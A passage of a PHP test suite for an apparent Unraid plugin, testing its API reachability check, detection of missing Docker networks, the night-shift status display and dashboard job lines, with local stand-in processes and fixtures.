    foreach (array_keys((array) $b['host']['doors']) as $k) {
        if (str_starts_with((string) $k, 'api_')) {
            unset($b['host']['doors'][$k]);
        }
    }
    writeAtomic("$day/baseline.json", jsonEncode($b));
    $key("$id3.json", $id3, 'Made before the update', ['ADMIN'], []);
    $apiCfg(['extraOrigins' => ['https://other.example.com'], 'sandbox' => true, 'ssoSubIds' => ['sub-x']]);
    same('api: after the update the first look is normal', [[], true, true],
        [watchmanRound($paths, $day, 1000, $now + 2700, $docker, false, $acks)['added'], isset(watchmanLoad($day)['baseline']['host']['api'][$id3]),
         isset(watchmanLoad($day)['baseline']['host']['doors']['api_origin:https://other.example.com'])]);
    $apiCfg(['extraOrigins' => ['https://other.example.com'], 'sandbox' => true, 'ssoSubIds' => ['sub-x', 'sub-y']]);
    same('api: then another Unraid.net account is a door like a WireGuard peer', [['door_new'], 1],
        [watchmanRound($paths, $day, 1000, $now + 3000, $docker, false, $acks)['added'],
         (array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => watchmanOpen($e) && $e['key'] === 'door_new:api_sso'))[0]['p']['new_peers'] ?? null)]);

    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($day, 'book'));
    @unlink(watchmanLockFile($day, 'round'));
    hardeningRm($tmp);
}

/**
 * The team lead's look at Unraid's API service: one keyless question over its socket (PHP's curl, ~2 ms), against a
 * stand-in API that writes down what it was asked — no key, no other header; no answer, an error, no socket: not running.
 */
function testCaretakerApi(): void
{
    $tmp = hardeningTmp('apiup');
    $rc = "$tmp/rc.unraid-api";
    $sock = "$tmp/api.sock";
    same('api check: no API on this Unraid — nothing to say', null, caretakerApiUp($sock, $rc));
    file_put_contents($rc, "#!/bin/bash\n");
    same('api check: no socket — not running', false, caretakerApiUp($sock, $rc));
    file_put_contents($sock, '');
    same('api check: a plain file where the socket belongs — not running', false, caretakerApiUp($sock, $rc));
    @unlink($sock);
    // a stand-in for the API: one connection, the request written down, then its answer (or none)
    file_put_contents("$tmp/api.php", '<?php
[, $sock, $reply, $log] = $argv;
$s = stream_socket_server("unix://$sock", $e, $es);
echo "ready\n";
$c = $s ? @stream_socket_accept($s, 10) : false;
if ($c) {
    stream_set_timeout($c, 3);
    $req = "";
    while (!str_contains($req, "\r\n\r\n") && !feof($c)) { $req .= (string) fread($c, 8192); }
    $need = preg_match("/content-length:\s*(\d+)/i", $req, $m) ? (int) $m[1] : 0;
    while (strlen(substr($req, strpos($req, "\r\n\r\n") + 4)) < $need && !feof($c)) { $req .= (string) fread($c, 8192); }
    file_put_contents($log, $req);
    if ($reply === "silent") { sleep(1); } else {
        fwrite($c, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: " . strlen($reply) . "\r\nConnection: close\r\n\r\n" . $reply);
    }
    fclose($c);
}
');
    $ask = function (string $reply, int $waitMs = 2000) use ($tmp, $sock, $rc): array {
        @unlink($sock);
        @unlink("$tmp/request");
        $p = proc_open([PHP_BINARY, "$tmp/api.php", $sock, $reply, "$tmp/request"], [1 => ['pipe', 'w'], 2 => ['file', '/dev/null', 'a']], $pipes);
        fgets($pipes[1]);
        $t = microtime(true);
        $up = caretakerApiUp($sock, $rc, $waitMs);
        $ms = (microtime(true) - $t) * 1000;
        fclose($pipes[1]);
        proc_close($p);
        return [$up, (string) @file_get_contents("$tmp/request"), $ms];
    };
    [$up, $req] = $ask('{"data":{"isSSOEnabled":false}}');
    same('api check: it answers — running', true, $up);
    check('api check: one keyless question — POST /graphql, isSSOEnabled, no key, no cookie, no token',
        str_starts_with($req, "POST /graphql HTTP/1.1\r\n") && str_ends_with($req, "\r\n\r\n" . CARETAKER_API_QUERY)
        && !preg_match('/^(?:x-api-key|cookie|authorization|x-csrf-token|x-local-session):/mi', $req), $req);
    same('api check: an error instead of the answer — not running', false, $ask('{"errors":[{"message":"Graphql is offline."}]}')[0]);
    [$up, , $ms] = $ask('silent', 300);
    check('api check: no answer within its time — not running, and it waited no longer', $up === false && $ms < 1500, (string) round($ms));
    same('api check: the finding the team lead shows — recommended, a link to Management Access; none without the API',
        [['api_down', 'recommended', false, 'management'], null], [array_values(array_intersect_key(caretakerApiFinding(false), ['id' => 1, 'level' => 1, 'ok' => 1, 'link' => 1])),
         caretakerApiFinding(null)]);
    hardeningRm($tmp);
}

/**
 * The team lead's vanished network (caretakerNetworkFindings(), agent/desks/caretaker.php): a container pointing at a
 * network Docker no longer has — by name (deleted), or by an ID the name no longer has (deleted and created again).
 * Fixtures tests/fixtures/networks/: `docker inspect` of invented containers and `docker network ls --no-trunc`'s list.
 */
function testCaretakerNetworks(): void
{
    $fx = __DIR__ . '/fixtures/networks';
    $inspect = json_decode((string) file_get_contents("$fx/inspect.json"), true);
    $networks = caretakerNetworkList((string) file_get_contents("$fx/networks.txt"));
    same('networks: the list — full ID => name, Docker\'s own three among them', ['bridge', 'host', 'none', 'family-net', 'media-net'],
        array_values($networks));
    same('networks: the list — a line not of that shape is no network', [],
        caretakerNetworkList("NETWORK ID\tNAME\nnot-hex\tx\n" . str_repeat('a', 64) . "\t\n"));
    $byName = [];
    foreach ($inspect as $c) {
        $byName[ltrim($c['Name'], '/')] = $c;
    }
    $gaps = fn (array $names) => caretakerNetworkGaps(array_values(array_intersect_key($byName, array_flip($names))), $networks);

    same('networks: on its network, Docker\'s own (bridge, host, none, default — a stale bridge ID too), container:<other>, '
        . 'a NetworkMode given as an ID, one never started (no ID yet) — nothing to say',
        [], $gaps(['notes-app', 'vpn-tunnel', 'torrent-client', 'media-host', 'sleepy-db', 'id-mode', 'default-mode', 'fresh-created']));
    same('networks: missing by name — the container and the network named', [['name' => 'photo-share', 'network' => 'old-lan', 'recreated' => false]],
        $gaps(['photo-share']));
    same('networks: the same name created again, the container holds the old ID — re-created', [['name' => 'recipe-box', 'network' => 'family-net', 'recreated' => true]],
        $gaps(['recipe-box']));
    same('networks: a second network gone while the first is there — only the gone one', [['name' => 'web-frontend', 'network' => 'backend-net', 'recreated' => false]],
        $gaps(['web-frontend']));
    $lost = $byName['lost-id']['HostConfig']['NetworkMode'];
    same('networks: a NetworkMode that is an ID nobody has — named by its short ID', [['name' => 'lost-id', 'network' => substr($lost, 0, 12), 'recreated' => false]],
        $gaps(['lost-id']));
    same('networks: all of them — sorted by container, each once', ['lost-id', 'photo-share', 'recipe-box', 'web-frontend'],
        array_column(caretakerNetworkGaps($inspect, $networks), 'name'));
    same('networks: no network list (Docker didn\'t answer) — nothing to say, never every container lost', [], caretakerNetworkGaps($inspect, []));
    same('networks: a list that isn\'t inspect\'s shape — nothing', [], caretakerNetworkGaps([null, 'x', ['Name' => '']], $networks));

    $f = caretakerNetworkFindings($inspect, $networks);
    same('networks: the findings — recommended, not in place, a link to Unraid\'s Docker page, container and network as params',
        [['network_gone', 'recommended', false, 'docker', ['name' => 'lost-id', 'network' => substr($lost, 0, 12)]],
         ['network_gone', 'recommended', false, 'docker', ['name' => 'photo-share', 'network' => 'old-lan']],
         ['network_recreated', 'recommended', false, 'docker', ['name' => 'recipe-box', 'network' => 'family-net']],
         ['network_gone', 'recommended', false, 'docker', ['name' => 'web-frontend', 'network' => 'backend-net']]],
        array_map(fn ($x) => [$x['id'], $x['level'], $x['ok'], $x['link'], $x['params']], $f));
    same('networks: no containers — no findings', [], caretakerNetworkFindings([], $networks));

    // read-only: Docker is only asked (ps, inspect, network ls), never told
    $rf = new ReflectionFunction('caretakerNetworkFacts');
    $src = implode('', array_slice(file($rf->getFileName()), $rf->getStartLine() - 1, $rf->getEndLine() - $rf->getStartLine() + 1));
    preg_match_all("/\\[\\\$docker,\\s*'([a-z]+)'(?:,\\s*'([a-z]+)')?/", $src, $m, PREG_SET_ORDER);
    same('networks: read-only — Docker is asked ps, inspect and network ls, nothing else',
        ['ps', 'inspect', 'network ls'], array_map(fn ($x) => $x[1] === 'network' ? 'network ' . ($x[2] ?? '') : $x[1], $m));
    check('networks: read-only — no word that changes a container or a network', !preg_match('/\'(?:rm|create|connect|disconnect|start|stop|restart|prune|update)\'/', $src));
    $en = json_decode((string) file_get_contents(OFFICE_WEB . '/desks/caretaker/lang/en.json'), true);
    check('networks: the how-texts name the way in Unraid — ⟦Docker⟧ → ⟦Edit⟧ (→ ⟦Network Type⟧ when gone) → ⟦Apply⟧',
        str_contains($en['check.network_gone_how'], '⟦Docker⟧ → {name} → ⟦Edit⟧ → ⟦Network Type⟧, then ⟦Apply⟧')
        && str_contains($en['check.network_recreated_how'], '⟦Docker⟧ → {name} → ⟦Edit⟧ → ⟦Apply⟧'));
}

/**
 * The night shift on the office's page and on the Dashboard tile while the array is stopped: officeNightShift()
 * (src/mailbox.php) reads RAM only — the pid in its lock (a living `agent.php nightshift`; it never takes the lock, so
 * the night shift's own non-blocking lock at its start never meets it) and its state — and the web side without its
 * data folder (the array stopped) answers without a warning. In a process of its own (bootstrap.php) on a copy laid
 * out like the plugin (src/ beside the web files).
 */
function testNightUi(): void
{
    $tmp = hardeningTmp('nightui');
    $now = time();
    @mkdir("$tmp/plugin/src", 0700, true);
    foreach (glob(OFFICE_DIR . '/src/*.php') ?: [] as $f) {
        copy($f, "$tmp/plugin/src/" . basename($f));
    }
    foreach (['assets', 'desks', 'lang'] as $d) {
        @symlink(OFFICE_WEB . "/$d", "$tmp/plugin/$d");
    }
    // a night shift: a process whose command line is `… agent.php nightshift` (a stand-in that only waits); one that ended
    file_put_contents("$tmp/agent.php", "<?php sleep(60);\n");
    $quiet = [0 => ['file', '/dev/null', 'r'], 1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']];
    $shift = proc_open([PHP_BINARY, "$tmp/agent.php", 'nightshift'], $quiet, $pipes);
    $pid = (int) (proc_get_status($shift)['pid'] ?? 0);
    for ($i = 0; $i < 60 && !str_contains((string) @file_get_contents("/proc/$pid/cmdline"), 'nightshift'); $i++) {
        usleep(50000);
    }
    $ended = proc_open([PHP_BINARY, "$tmp/agent.php", 'nightshift', 'x'], $quiet, $pipes);
    $gone = (int) (proc_get_status($ended)['pid'] ?? 0);
    proc_terminate($ended);
    proc_close($ended);

    $since = $now - 120;
    $state = ['hired' => 1000, 'night' => ['since' => $since, 'from' => 'ram', 'rounds' => 7, 'new' => 1], 'round' => ['time' => $now - 60]];
    $runs = [
        'on'        => [$pid, $state],
        'quiet'     => [$pid, ['night' => ['since' => $since, 'from' => 'flash', 'rounds' => 1, 'new' => 0]] + $state],
        'old'       => [$pid, ['night' => ['since' => $since, 'from' => 'ram']] + $state],      // a night shift of an older agent: no counts
        'off'       => [null, $state],                  // no lock: no night shift since the boot
        'stale'     => [$gone, $state],                 // a stale lock: its process ended (the agent took over)
        'other'     => [getmypid(), $state],            // its pid now another process's
        'junk'      => ["$pid\n1", $state],
        'no_mirror' => [$pid, null],                    // on, but no mirror (not hired, no round yet): no state, it ends at once
        'day'       => [$pid, ['night' => ['since' => 1, 'until' => 2, 'from' => 'ram']] + $state],     // the day's, after a handover
        'unhired'   => [$pid, ['hired' => 0] + $state],
    ];
    foreach ($runs as $name => [$lockPid, $st]) {
        @mkdir("$tmp/run-$name/nightshift", 0700, true);
        if ($lockPid !== null) {
            file_put_contents("$tmp/run-$name/nightshift.lock", (string) $lockPid);
        }
        if ($st !== null) {
            file_put_contents("$tmp/run-$name/nightshift/state.json", json_encode($st));
        }
    }
    // an agent at work: its data folder with a fresh agent.json and the mailbox
    @mkdir("$tmp/data/mailbox", 0700, true);
    file_put_contents("$tmp/data/agent.json", json_encode(['running' => true, 'version' => AGENT_VERSION, 'pid' => 4242, 'started' => $now, 'host' => 'test']));

    $plugin = var_export("$tmp/plugin/src", true);
    file_put_contents("$tmp/web.php", '<?php foreach (["bootstrap", "page", "dashboard", "api"] as $f) { require ' . $plugin . ' . "/$f.php"; }'
        . ' date_default_timezone_set("Europe/Zurich"); error_reporting(E_ALL);'
        . ' set_error_handler(function (int $no, string $s, string $file, int $line): bool { if (error_reporting() & $no) { fwrite(STDERR, "PHP: $s ($file:$line)\n"); } return true; });'
        . ' if ($argv[1] === "read") { $out = []; foreach (json_decode($argv[2], true) as $n) { $out[$n] = officeNightShift(' . var_export($tmp, true) . ' . "/run-$n"); }'
        . ' echo json_encode($out); exit; }'
        . ' if ($argv[1] === "api") { $_SERVER["REQUEST_METHOD"] = "GET"; $_GET = ["a" => $argv[2], "lang" => "en", "desk" => $argv[3] ?? ""]; api_main(); }'
        . ' echo json_encode(["agent" => agentInfo(), "config" => officePageConfig()["agent"], "en" => officeDashRows("en"), "de" => officeDashRows("de"),'
        . ' "fr" => officeDashRows("fr")]);');
    $web = function (array $args, string $run, string $data = 'missing') use ($tmp): array {
        $p = proc_open(array_merge([PHP_BINARY, "$tmp/web.php"], $args), [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => "$tmp/$data", 'OFFICE_RUN_DIR' => "$tmp/run-$run", 'PATH' => getenv('PATH')]);
        $out = (string) stream_get_contents($pipes[1]);
        $err = (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return [json_decode($out, true), trim($err), $out];
    };

    [$read, $err, $raw] = $web(['read', json_encode(array_keys($runs))], 'on');
    same('night ui: on — since when, its rounds, what is new, the last round', ['since' => $since, 'rounds' => 7, 'new' => 1, 'last' => $now - 60], $read['on'] ?? $raw);
    same('night ui: on, nothing new yet; an older agent\'s state without counts', [[1, 0], [0, 0]],
        [[$read['quiet']['rounds'] ?? null, $read['quiet']['new'] ?? null], [$read['old']['rounds'] ?? null, $read['old']['new'] ?? null]]);
    same('night ui: off — no lock, a stale lock, another process\'s pid, junk, no mirror, the day\'s state, not hired',
        array_fill_keys(['off', 'stale', 'other', 'junk', 'no_mirror', 'day', 'unhired'], null),
        array_intersect_key($read ?? [], array_flip(['off', 'stale', 'other', 'junk', 'no_mirror', 'day', 'unhired'])));
    same('night ui: read without a word', '', $err);
    same('night ui: the lock left as it was (never taken, never written)', (string) $pid, (string) file_get_contents("$tmp/run-on/nightshift.lock"));

    // the array stopped (no data folder), the night shift on: the page knows at once, the tile has its line
    [$o, $err, $raw] = $web(['web'], 'on');
    same('night ui: no data folder, night shift on — no warning', '', $err);
    same('night ui: the agent\'s info carries it, the page gets it at once', [false, true, $read['on'], $read['on']],
        [$o['agent']['running'] ?? null, isset($o['agent']['no_data']), $o['agent']['night'] ?? null, $o['config']['night'] ?? null]);
    $at = date('Y-m-d', $since) === date('Y-m-d', $now) ? date('H:i', $since) : null;      // else «yesterday 23:59» (a run just after midnight)
    $en = (string) ($o['en'] ?? '');
    check('night ui: the tile — the messenger says the array, his line with since, rounds and what is new',
        str_contains($en, 'Array stopped') && str_contains($en, 'desks/watchman/avatar.svg') && str_contains($en, 'The Night Watchman')
        && ($at === null || str_contains($en, "Night shift since $at")) && str_contains($en, '7 rounds, 1 new entry') && str_contains($en, 'orange-text'), $raw);
    check('night ui: the tile in German and French', str_contains((string) ($o['de'] ?? ''), '7 Rundgänge, 1 neuer Eintrag') && str_contains((string) ($o['de'] ?? ''), 'Der Nachtwächter')
        && str_contains((string) ($o['fr'] ?? ''), '7 rondes, 1 nouvelle entrée'), $raw);
    check('night ui: the tile links to the office\'s reception', (bool) preg_match('~<a class="sso-dash-row" href="[^"]*#/"><img class="sso-dash-icon" src="[^"]*desks/watchman/avatar\.svg~', $en), $en);
    [$o, , $raw] = $web(['web'], 'quiet');
    check('night ui: nothing new — calm', str_contains((string) ($o['en'] ?? ''), '1 round, nothing new') && !str_contains((string) ($o['en'] ?? ''), '1 new'), $raw);
    [$o, , $raw] = $web(['web'], 'old');
    check('night ui: no counts (an older agent) — only what is new', str_contains((string) ($o['en'] ?? ''), '<small>nothing new</small>'), $raw);

    // off (the night shift ended, its lock stays behind): nothing about it, no warning
    [$o, $err, $raw] = $web(['web'], 'stale');
    same('night ui: a stale lock — nothing on the page or the tile, no warning', [false, false, false, ''],
        [isset($o['agent']['night']), isset($o['config']['night']), str_contains((string) ($o['en'] ?? ''), 'watchman'), $err]);
    // the agent at work (the array started): never the night's line, even while a night shift still lives
    [$o, $err, $raw] = $web(['web'], 'on', 'data');
    same('night ui: the agent at work — no night line', [true, false, false, true, ''],
        [$o['agent']['running'] ?? null, isset($o['agent']['night']), str_contains((string) ($o['en'] ?? ''), 'watchman'),
         str_contains((string) ($o['en'] ?? ''), 'Messenger is in'), $err]);

    // the API: ?a=agent for the reception's look every minute, ?a=dash for the tile
    [$o, $err, $raw] = $web(['api', 'agent'], 'on');
    same('night ui: api agent', [true, $read['on'], ''], [$o['ok'] ?? null, $o['agent']['night'] ?? null, $err]);
    [$o, $err, $raw] = $web(['api', 'dash'], 'on');
    check('night ui: api dash', ($o['ok'] ?? null) === true && str_contains((string) ($o['html'] ?? ''), '7 rounds, 1 new entry') && $err === '', $raw . $err);
    [$o, $err, $raw] = $web(['api', 'state', 'caretaker'], 'on');
    same('night ui: a desk\'s state without the data folder — none, the night in the agent\'s info, no warning', [true, null, true, ''],
        [$o['ok'] ?? null, $o['state'] ?? null, isset($o['agent']['night']), $err]);

    // every text the tile asks for exists (officeDashT … '<key>')
    $en = json_decode((string) file_get_contents(OFFICE_WEB . '/lang/en.json'), true) ?: [];
    foreach (glob(OFFICE_WEB . '/desks/*/lang/en.json') ?: [] as $file) {
        foreach (json_decode((string) file_get_contents($file), true) ?: [] as $k => $v) {
            $en[basename(dirname($file, 2)) . ".$k"] = $v;
        }
    }
    preg_match_all("/officeDashT\\(\\\$s(?:trings)?, '([a-z0-9_.]+)'/", (string) file_get_contents(OFFICE_DIR . '/src/dashboard.php'), $m);
    $missing = array_values(array_filter(array_unique($m[1]), fn ($k) => !isset($en[$k])));
    check('dashboard.php: every text it asks for exists (' . count(array_unique($m[1])) . ')', $missing === [] && count($m[1]) > 10, json_encode($missing));

    proc_terminate($shift);
    proc_close($shift);
    hardeningRm($tmp);
}

/**
 * The Dashboard tile's running jobs (agent/lib/jobs.php office.jobs, src/dashboard.php officeDashJobLine()): what each desk's
 * job writes becomes one line — Mr. Backupsy's step, Mr. Restori's restore and drill, Ms. Snapshotini's plans, Jack
 * Streamer's percent and file, Ms. Moverelli's moved files and the night run's step; nothing running: the quiet rows
 */
function testDashboardJobs(): void
{
    $tmp = hardeningTmp('dashjobs');
    // the agent's side: Mr. Backupsy — only a backup holds the lock as a run (never setup, a restore, the recovery)
    $holder = ['holder' => 'backup', 'mode' => 'backup', 'what' => '', 'run' => '', 'pid' => 4242, 'started' => 1000];
    $status = ['result' => 'running', 'mode' => 'backup', 'phase' => 'kopia', 'started' => 1100,
               'kopia' => ['planned' => ['appdata', 'Familienfilme', 'domains'], 'done' => ['appdata'], 'current' => 'Familienfilme']];
    $b = officeJobsBackup("$tmp/none", $holder, $status)[0] ?? [];
    same('dash jobs: a backup in the offsite step — mode, phase, 1 of 3 done, the share at work, since', ['backup', 'backup', 'kopia', 1, 3, 'Familienfilme', 1100],
        [$b['desk'] ?? null, $b['mode'] ?? null, $b['phase'] ?? null, $b['done'] ?? null, $b['total'] ?? null, $b['current'] ?? null, $b['started'] ?? null]);
    same('dash jobs: setup, a restore, the recovery after a start hold the lock — no backup line', [[], [], []],
        [officeJobsBackup("$tmp/none", ['holder' => 'setup'] + $holder, $status), officeJobsBackup("$tmp/none", ['holder' => 'restore'] + $holder, $status),
         officeJobsBackup("$tmp/none", ['mode' => 'recover'] + $holder, $status)]);
    $old = officeJobsBackup("$tmp/none", ['holder' => 'other'] + $holder, [])[0] ?? [];
    same('dash jobs: an engine holding the lock without a status - a run all the same, no step', ['backup', '', null], [$old['kind'] ?? null, $old['phase'] ?? null, $old['total'] ?? null]);
    same('dash jobs: the lock free (no state folder) — nothing', [], officeJobsBackup("$tmp/none"));

    // the steps of a restore or drill: the last one begun
    same('dash jobs: steps — two of four begun, none, junk', [['step' => 2, 'steps' => 4], ['step' => 0, 'steps' => 2], ['step' => 0, 'steps' => 1]],
        [officeJobsSteps([['state' => 'ok'], ['state' => 'running'], ['state' => 'pending'], []]), officeJobsSteps([[], ['state' => 'pending']]), officeJobsSteps(['x'])]);

    // Ms. Snapshotini: her round holds its lock in RAM
    $lock = "$tmp/snapshot-plans.lock";
    same('dash jobs: no lock file — no line', [], officeJobsSnapshot($lock));
    $fh = fopen($lock, 'c');
    same('dash jobs: the lock there, free — no line', [], officeJobsSnapshot($lock));
    flock($fh, LOCK_EX);
    same('dash jobs: the lock held — her plans at work', [['desk' => 'snapshot', 'kind' => 'plans']], officeJobsSnapshot($lock));
    flock($fh, LOCK_UN);
    fclose($fh);

    // Jack Streamer: a real run with its live panel (percent by bytes, the file it is on), a dry run, the gather
    $prog = ['phase' => 'fill', 'total' => ['files' => 4, 'done_files' => 1, 'bytes' => 4000, 'done_bytes' => 1450],
             'current' => ['phase' => 'fill', 'rel' => 'Familienfilme/Sommer am See (2019)/Sommer am See.mkv']];
    $j = officeJobsJack(['embycache' => ['running' => true, 'mode' => 'run', 'by' => 'night'], 'gather' => ['running' => false]], $prog);
    same('dash jobs: Jack Streamer fetching — 36 %, the file\'s name only', [[1], 'embycache', 'run', 36, 'Sommer am See.mkv', false],
        [[count($j)], $j[0]['kind'] ?? null, $j[0]['mode'] ?? null, $j[0]['percent'] ?? null, $j[0]['file'] ?? null, $j[0]['back'] ?? null]);
    $prog['current']['phase'] = 'back';
    same('dash jobs: Jack Streamer giving back', true, officeJobsJack(['embycache' => ['running' => true, 'mode' => 'run']], $prog)[0]['back'] ?? null);
    $j = officeJobsJack(['embycache' => ['running' => true, 'mode' => 'dry'], 'gather' => ['running' => true, 'mode' => 'run']], null);
    same('dash jobs: a dry run (no panel) and the gather', [['embycache', 'dry', null, null], ['gather', 'run']],
        [[$j[0]['kind'] ?? null, $j[0]['mode'] ?? null, $j[0]['percent'] ?? null, $j[0]['file'] ?? null], [$j[1]['kind'] ?? null, $j[1]['mode'] ?? null]]);
    same('dash jobs: nothing running — nothing', [], officeJobsJack(['embycache' => ['running' => false], 'gather' => []], null));

    // Ms. Moverelli: her own run (Smart Mover's live status: moved so far = the shares done + the one at work), the night run
    $dir = "$tmp/moverelli";
    @mkdir($dir, 0700, true);
    file_put_contents("$dir/status.json", json_encode(['result' => 'running', 'phase' => 'share', 'share' => 'Familienserien', 'share_done_files' => 3,
        'shares' => [['share' => 'Familienfilme', 'moved' => 9], 'junk']]));
    $m = officeJobsMoverelli($dir, ['running' => true, 'mode' => 'run'], [])[0] ?? [];
    same('dash jobs: her real run — the share at work, 12 moved', ['run', 'run', 'share', 'Familienserien', 12],
        [$m['kind'] ?? null, $m['mode'] ?? null, $m['phase'] ?? null, $m['share'] ?? null, $m['moved'] ?? null]);
    $m = officeJobsMoverelli($dir, ['running' => true, 'mode' => 'dry'], [])[0] ?? [];
    same('dash jobs: her dry run — nothing counted as moved', ['run', 'dry', null], [$m['kind'] ?? null, $m['mode'] ?? null, $m['moved'] ?? null]);
    $m = officeJobsMoverelli($dir, ['running' => false], ['running' => true, 'mode' => 'run', 'phase' => 'fill', 'who' => 'jack'])[0] ?? [];
    same('dash jobs: the night run, Jack Streamer\'s step — its phase, not her status', ['night', 'fill', null, null],
        [$m['kind'] ?? null, $m['phase'] ?? null, $m['share'] ?? null, $m['moved'] ?? null]);
    $m = officeJobsMoverelli($dir, ['running' => false], ['running' => true, 'mode' => 'run', 'phase' => 'free', 'who' => 'her'])[0] ?? [];
    same('dash jobs: the night run, her step — with what she moved', ['night', 'free', 12], [$m['kind'] ?? null, $m['phase'] ?? null, $m['moved'] ?? null]);
    $m = officeJobsMoverelli($dir, ['running' => false], ['running' => true, 'mode' => 'run', 'phase' => 'free', 'who' => 'jack', 'jack' => true])[0] ?? [];
    $o = officeJobsMoverelli($dir, ['running' => false], ['running' => true, 'mode' => 'run', 'phase' => 'free', 'who' => 'her', 'jack' => true, 'jack_out' => 'jack_watching'])[0] ?? [];
    same('dash jobs: the night — whose step and whether Jack Streamer is in it (her card\'s step names); her own run without them',
        [['jack', true], ['her', false], false], [[$m['who'] ?? 'x', $m['with_jack'] ?? 'x'], [$o['who'] ?? 'x', $o['with_jack'] ?? 'x'],
         array_key_exists('who', officeJobsMoverelli($dir, ['running' => true, 'mode' => 'run'], [])[0] ?? [])]);
    same('dash jobs: neither — nothing', [], officeJobsMoverelli($dir, ['running' => false], ['running' => false]));

    // the action: only hired desks are asked; the agent answers office.jobs
    same('dash jobs: nobody hired — nothing asked', [], officeJobs([]));
    $a = handle(json_encode(['action' => 'office.jobs']));
    check('dash jobs: the agent answers office.jobs', ($a['ok'] ?? null) === true && is_array($a['jobs'] ?? null), json_encode($a));

    // the web side, in a process of its own: each job's line, then the rows with and without them
    @mkdir("$tmp/data/office", 0700, true);
    file_put_contents("$tmp/data/office/staff.json", json_encode(['hired' => array_fill_keys(['backup', 'restore', 'snapshot', 'jack', 'moverelli'], 1)]));
    // Mr. Backupsy's state file still says «running» (written while the run went, nobody looked since)
    file_put_contents("$tmp/data/backup.json", json_encode(['running' => true, 'history' => [['result' => 'ok', 'started' => 1, 'finished' => 2]],
        'schedule' => ['enabled' => false]]));
    $jobs = [
        ['desk' => 'backup', 'kind' => 'backup', 'mode' => 'backup', 'phase' => 'kopia', 'done' => 1, 'total' => 3, 'current' => 'x', 'partner' => null],
        ['desk' => 'restore', 'kind' => 'restore', 'what' => 'appdata', 'step' => 2, 'steps' => 5],
        ['desk' => 'restore', 'kind' => 'drill', 'step' => 1, 'steps' => 3],
        ['desk' => 'snapshot', 'kind' => 'plans'],
        ['desk' => 'jack', 'kind' => 'embycache', 'mode' => 'run', 'phase' => 'fill', 'percent' => 36, 'file' => 'Sommer am See.mkv', 'back' => false],
        ['desk' => 'jack', 'kind' => 'embycache', 'mode' => 'release', 'phase' => 'back', 'percent' => null, 'file' => 'Herbst.mkv', 'back' => true],
        ['desk' => 'jack', 'kind' => 'gather', 'mode' => 'dry'],
        ['desk' => 'moverelli', 'kind' => 'run', 'mode' => 'run', 'phase' => 'share', 'share' => 'Familienserien', 'moved' => 12],
        ['desk' => 'moverelli', 'kind' => 'night', 'mode' => 'run', 'phase' => 'fill', 'share' => null, 'moved' => null],
        ['desk' => 'moverelli', 'kind' => 'run', 'mode' => 'run', 'phase' => 'look', 'share' => null, 'moved' => 1],
        ['desk' => 'future', 'kind' => 'thing'],
        ['desk' => 'moverelli', 'kind' => 'night', 'mode' => 'run', 'phase' => 'free', 'share' => null, 'moved' => null, 'who' => 'jack', 'with_jack' => true],
        ['desk' => 'moverelli', 'kind' => 'night', 'mode' => 'run', 'phase' => 'free', 'share' => null, 'moved' => null, 'who' => 'her', 'with_jack' => true],
    ];
    // the plugin's layout: src/ beside the web files
    @mkdir("$tmp/plugin/src", 0700, true);
    foreach (glob(OFFICE_DIR . '/src/*.php') ?: [] as $f) {
        copy($f, "$tmp/plugin/src/" . basename($f));
    }
    foreach (['assets', 'desks', 'lang'] as $d) {
        @symlink(OFFICE_WEB . "/$d", "$tmp/plugin/$d");
    }
    $code = 'require ' . var_export("$tmp/plugin/src/bootstrap.php", true) . '; require_once ' . var_export("$tmp/plugin/src/page.php", true) . ';'
        . ' require_once ' . var_export("$tmp/plugin/src/dashboard.php", true) . '; $jobs = json_decode(' . var_export(json_encode($jobs), true) . ', true);'
        . ' $out = []; foreach (["en", "de"] as $l) { $s = officeStrings($l); $out[$l] = array_map(fn ($j) => ($x = officeDashJobLine($s, $j)) === null ? null : [$x[0], basename(strtok($x[1], "?")), $x[2], $x[3], $x[5]], $jobs); }'
        . ' $out["quiet"] = officeDashRows("en", []); $out["busy"] = officeDashRows("en", $jobs); $out["unknown"] = officeDashRows("en");'
        . ' echo json_encode($out);';
    $p = proc_open(['php', '-r', $code], [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
        ['OFFICE_DATA_DIR' => "$tmp/data", 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => getenv('PATH')]);
    $raw = (string) stream_get_contents($pipes[1]);
    $err = (string) stream_get_contents($pipes[2]);
    proc_close($p);
    $o = json_decode($raw, true) ?: [];
    same('dash jobs: the web side without a word', '', trim($err));
    same('dash jobs: each line — route, face, name, how far, what it does (en)', [
        ['backup', 'avatar.svg', 'Mr. Backupsy', 'Backing up right now', 'Offsite · 2 of 3'],
        ['restore', 'avatar.svg', 'Mr. Restori', 'restoring appdata', 'Step 2 of 5'],
        ['restore/drill', 'avatar.svg', 'Mr. Restori', 'Drill running', 'Step 1 of 3'],
        ['snapshot', 'avatar.svg', 'Ms. Snapshotini', 'Taking snapshots', ''],
        ['jack', 'avatar.svg', 'Jack Streamer', '36 %', 'Fetching Sommer am See.mkv'],
        ['jack', 'avatar.svg', 'Jack Streamer', 'At work', 'Giving back Herbst.mkv'],
        ['jack', 'avatar.svg', 'Jack Streamer', 'Consolidating folders', 'Dry run'],
        ['moverelli', 'avatar.svg', 'Ms. Moverelli', '12 files moved', 'Share Familienserien'],
        ['moverelli', 'avatar.svg', 'Ms. Moverelli', 'At work', 'Joint run · Jack Streamer fetches'],
        ['moverelli', 'avatar.svg', 'Ms. Moverelli', '1 file moved', 'Looking around'],
        null,
        ['moverelli', 'avatar.svg', 'Ms. Moverelli', 'At work', 'Joint run · Jack Streamer gives back'],
        ['moverelli', 'avatar.svg', 'Ms. Moverelli', 'At work', 'Joint run · Ms. Moverelli makes room']], $o['en'] ?? $raw);
    same('dash jobs: German', ['Sichert gerade', 'Schritt 2 von 5', '12 Dateien verschoben', 'Holt Sommer am See.mkv'],
        [$o['de'][0][3] ?? null, $o['de'][1][4] ?? null, $o['de'][7][3] ?? null, $o['de'][4][4] ?? null]);
